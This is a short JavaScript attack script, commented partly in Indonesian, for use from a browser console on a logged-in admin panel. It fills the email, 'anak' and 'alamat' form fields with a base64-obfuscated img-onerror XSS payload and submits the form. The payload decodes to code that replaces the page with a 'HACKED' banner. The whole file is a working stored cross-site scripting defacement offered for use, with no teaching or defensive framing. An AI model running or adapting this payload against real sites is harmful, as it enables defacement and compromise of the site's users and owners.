
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<img src=x onerror="eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxkaXagc3R5bGU9ImJhY2tncm91bmQ6IzAwMDtjb2xvcjojMGYwO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtoZWlnaHQ6MTAwdmgiPkhBQ0tFRDwvZGl2Pic='))">`;
    document.getElementById('anak').value = `<img src=x onerror="eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxkaXagc3R5bGU9ImJhY2tncm91bmQ6IzAwMDtjb2xvcjojMGYwO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtoZWlnaHQ6MTAwdmgiPkhBQ0tFRDwvZGl2Pic='))">`;
    document.getElementById('alamat').value = `<img src=x onerror="eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9JzxkaXagc3R5bGU9ImJhY2tncm91bmQ6IzAwMDtjb2xvcjojMGYwO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtoZWlnaHQ6MTAwdmgiPkhBQ0tFRDwvZGl2Pic='))">`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
